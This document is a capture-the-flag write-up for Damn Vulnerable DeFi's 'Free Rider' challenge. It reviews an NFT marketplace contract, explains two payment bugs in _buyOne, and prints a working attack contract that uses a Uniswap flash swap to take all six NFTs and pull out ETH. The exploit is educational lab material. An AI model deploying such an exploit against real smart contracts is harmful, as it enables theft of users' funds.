## 1) Challenge

> <cite>A new marketplace of Damn Valuable NFTs has been released! There's been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.</cite>
> <cite>A buyer has shared with you a secret alpha: the marketplace is vulnerable and all tokens can be taken. Yet the buyer doesn't know how to do it. So it's offering a payout of 45 ETH for whoever is willing to take the NFTs out and send them their way.</cite>
> <cite>You want to build some rep with this buyer, so you've agreed with the plan.</cite>
> <cite>Sadly you only have 0.5 ETH in balance. If only there was a place where you could get free ETH, at least for an instant. </cite>([link](https://www.damnvulnerabledefi.xyz/challenges/10.html)

Challenge created by [@tinchoabbate](https://twitter.com/tinchoabbate).


## 2) Code Review
For this challenge, we have two contracts: `FreeRiderBuyer` ([source code](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/contracts/free-rider/FreeRiderBuyer.sol)) and `FreeRiderNFTMarketplace` ([source code](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/contracts/free-rider/FreeRiderNFTMarketplace.sol)).

`FreeRiderBuyer`:
```solidity

contract FreeRiderBuyer is ReentrancyGuard, IERC721Receiver {

    using Address for address payable;
    address private immutable partner;
    IERC721 private immutable nft;
    uint256 private constant JOB_PAYOUT = 45 ether;
    uint256 private received;

    constructor(address _partner, address _nft) payable {
        require(msg.value == JOB_PAYOUT);
        partner = _partner;
        nft = IERC721(_nft);
        IERC721(_nft).setApprovalForAll(msg.sender, true);
    }

    // Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) 
        external
        override
        nonReentrant
        returns (bytes4) 
    {
        require(msg.sender == address(nft));
        require(tx.origin == partner);
        require(_tokenId >= 0 && _tokenId <= 5);
        require(nft.ownerOf(_tokenId) == address(this));
        
        received++;
        if(received == 6) {            
            payable(partner).sendValue(JOB_PAYOUT);
        }            

        return IERC721Receiver.onERC721Received.selector;
    }
}

```

This contract is responsible for implementing the buyer role in our challenge. It sets the attacker address as the partner (line `23`) and implements the `onERC721Received` function to receive NFT that:
- checks if the sender is the NFT token contract (line `40`)
- checks if the `tx.origin` is the attacker address (line `41`)
- checks if the token ID is between 0 and 5 (line `43`)
- check if the owner of the token received is the contract (line `44`)
- finally, after it receives `6` tickets, it sends `45 ETH` to the attacker address (lines `46-48`)

`FreeRiderNFTMarketplace`:
```solidity

contract FreeRiderNFTMarketplace is ReentrancyGuard {

    using Address for address payable;

    DamnValuableNFT public token;
    uint256 public amountOfOffers;

    // tokenId -> price
    mapping(uint256 => uint256) private offers;

    event NFTOffered(address indexed offerer, uint256 tokenId, uint256 price);
    event NFTBought(address indexed buyer, uint256 tokenId, uint256 price);
    
    constructor(uint8 amountToMint) payable {
        require(amountToMint < 256, "Cannot mint that many tokens");
        token = new DamnValuableNFT();

        for(uint8 i = 0; i < amountToMint; i++) {
            token.safeMint(msg.sender);
        }        
    }

    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external nonReentrant {
        require(tokenIds.length > 0 && tokenIds.length == prices.length);
        for (uint256 i = 0; i < tokenIds.length; i++) {
            _offerOne(tokenIds[i], prices[i]);
        }
    }

    function _offerOne(uint256 tokenId, uint256 price) private {
        require(price > 0, "Price must be greater than zero");

        require(
            msg.sender == token.ownerOf(tokenId),
            "Account offering must be the owner"
        );

        require(
            token.getApproved(tokenId) == address(this) ||
            token.isApprovedForAll(msg.sender, address(this)),
            "Account offering must have approved transfer"
        );

        offers[tokenId] = price;

        amountOfOffers++;

        emit NFTOffered(msg.sender, tokenId, price);
    }

    function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
        for (uint256 i = 0; i < tokenIds.length; i++) {
            _buyOne(tokenIds[i]);
        }
    }

    function _buyOne(uint256 tokenId) private {       
        uint256 priceToPay = offers[tokenId];
        require(priceToPay > 0, "Token is not being offered");

        require(msg.value >= priceToPay, "Amount paid is not enough");

        amountOfOffers--;

        // transfer from seller to buyer
        token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);

        // pay seller
        payable(token.ownerOf(tokenId)).sendValue(priceToPay);

        emit NFTBought(msg.sender, tokenId, priceToPay);
    }    

    receive() external payable {}
}

```

It's the main contract of the challenge.
- `constructor`: 
    - it mints some tokens inside the constructor (lines `25-32`), that, according to the project setup are `6` NFTs ([setup](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/test/free-rider/free-rider.challenge.js#L77))
- `offersMany`:
    - prevents reentrancy by using the `nonReentrant` modifier
    - checks if the token array has the same length for the prices array (i.e. if each token has a corresponding price) - line `35`
    - calls `_offerOne` with each token ID and the corresponsign price (lines `36-38`)
- `_offersOne` (`private` function):
    - checks if the token price is `>0` (line `42`) and if the `msg.sender` is the owner of the token offered (lines `44-47`)
    - checks if the token transfer has been approved (lines `49-53`)
    - updates the `offers` variable with the token ID and its corresponding price (line `55`) and increments the `amountOfOffers` counter (line `57`)
- `buyMany`:
    - prevents reentrancy by using the `nonReentrant` modifier
    - for each token ID in `tokenIds` parameter, it calls the private function `_buyOne` (line `64`)
- `_buyOne`:
    - gets the price to pay for the corresponding token (line `69`)
    - checks if the price to pay is `>0`, meaning that there is an offer for that token (line `70`)
    - checks if the `msg.value` is `>=` than the amount to pay (line `72`)
    - decrements the `amountOfOffers` counter (line `74`)
    - transfers the token from the current owner to `msg.sender` by calling `safeTransferFrom` (line `77`)
    - sends the price to pay to  the NFT owner (line `80`), which should be the seller

The vulnerable function is `_buyOne`; in particular, there are `2` bugs in this function:
1. the token seller will never receive the amount because the `sendValue` function (line `80`) is called after the token ownership is transferred (line `77`). It means that the new owner of the token will also receive the amount offered for that token
2. `msg.value` is checked only for a single token offer (line `72`)  and not for the total amount of offers. Since `_buyOne` is executed inside a loop, if an attacker has at least the balance for the maximum token price, they can take ownership of all the tokens even if the sum of all their prices is greater. Since the NFT price is `15 ETH`, we need at least `15 ETH` to steal all the NFT (instead of `15*6=90 ETH`).

#### How can we obtain some ETH to buy the NFT tokens?

We start with `0.5 ETH` balance but we need at least `15 ETH` to take all the tokens successfully. If we take a closer look at the challenge [setup file](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/test/free-rider/free-rider.challenge.js), we can see that a UniswapV2 pair is deployed. After some research, I found that we can request flash swaps (i.e. flash loans). Using flash swaps, we can request the amount needed to perform the attack as long as we pay the amount back plus an additional fee of `~0.3%`.

## 3) Solution
The solution consists of the following steps:
- swap `15 WETH` using the Uniswap pair
- to receive the flash loan, we need to implement the `uniswapV2Call` function
- insider the `uniswapV2Call` function, withdraw the `15 ETH`
- call the `buyMany` function by providing the list of tokens IDs (i.e. `0,1,2,3,4,5`) with an offer of `15 ETH` each
- deposit back the amount requested plus an additional fee of `~0.3%`
- once the execution of `uniswapV2Call` is completed, we can transfer all the tokens to the buyer and the ETH we obtained from selling the tokens to our attacker address (even if it's not needed to solve this challenge)	

`AttackFreeRider.sol`:
```solidity

// ...
/**
 * @title AttackFreeRider
 */
contract AttackFreeRider {

    IUniswapV2Factory factory;
    IMarketplace marketplace;
    address TOKEN;
    address WETH;
    uint256 price;

    constructor(uint256 _price, address _factory, address _marketplace, address _token, address _weth) {
      factory = IUniswapV2Factory(_factory);
      marketplace = IMarketplace(_marketplace);
      TOKEN = _token;
      WETH = _weth;
      price = _price;
    }

    function run(address _attacker, address _buyer) external {
        address pair = factory.getPair(TOKEN, WETH);

        bytes memory data = abi.encode(WETH, price);

        IUniswapV2Pair(pair).swap(price, 0, address(this), data);
        
        // send tokens to buyer and receive ETH reward
        for (uint i=0; i<6; i++) {
            INFT(marketplace.token()).safeTransferFrom(address(this), _buyer, i);
        }

        // send all the ETH received to the attacker address
        (bool success,) = _attacker.call{value: address(this).balance}("");   
        assert(success);

    }

    function uniswapV2Call(address, uint, uint, bytes calldata) external {
        address token0 = IUniswapV2Pair(msg.sender).token0(); 
        address token1 = IUniswapV2Pair(msg.sender).token1(); 
        assert(msg.sender == factory.getPair(token0, token1)); 

        // deposit WETH to get (15) ETH
        IWETH(token0).withdraw(price);

        uint[] memory tokenIds = new uint[](6);
        for (uint i=0; i<tokenIds.length; i++) {
            tokenIds[i] = i;
        }

        // offer 15 ETH for each token
        marketplace.buyMany{value: price}(tokenIds);

        // amount + fee
        uint256 amount = price + (price * 3 / 997) + 1;
        IWETH(token0).deposit{value: amount}();
        assert(IWETH(token0).transfer(msg.sender, amount));

    }
  
    receive() external payable {}

    function onERC721Received(address, address, uint256, bytes memory) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

}

```

`free-rider.challenge.js`:
```javascript

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        const attack = await (await ethers.getContractFactory('AttackFreeRider', attacker))
            .deploy(NFT_PRICE, this.uniswapFactory.address, this.marketplace.address, this.token.address, this.weth.address);

        await attack.connect(attacker).run(attacker.address, this.buyerContract.address);

        expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(MARKETPLACE_INITIAL_ETH_BALANCE);

    });

```



You can find the complete code [here](https://github.com/dellalibera/damn-vulnerable-defi-solutions/blob/master/test/free-rider/free-rider.challenge.js) and [here](https://github.com/dellalibera/damn-vulnerable-defi-solutions/blob/master/contracts/attacker-contracts/AttackFreeRider.sol).


## 4) References

- [Uniswap v2 - Flash Swaps](https://docs.uniswap.org/protocol/V2/guides/smart-contract-integration/using-flash-swaps)
- [Uniswap v2 Core](https://uniswap.org/whitepaper.pdf)
- [EIP-721: Non-Fungible Token Standard](https://eips.ethereum.org/EIPS/eip-721)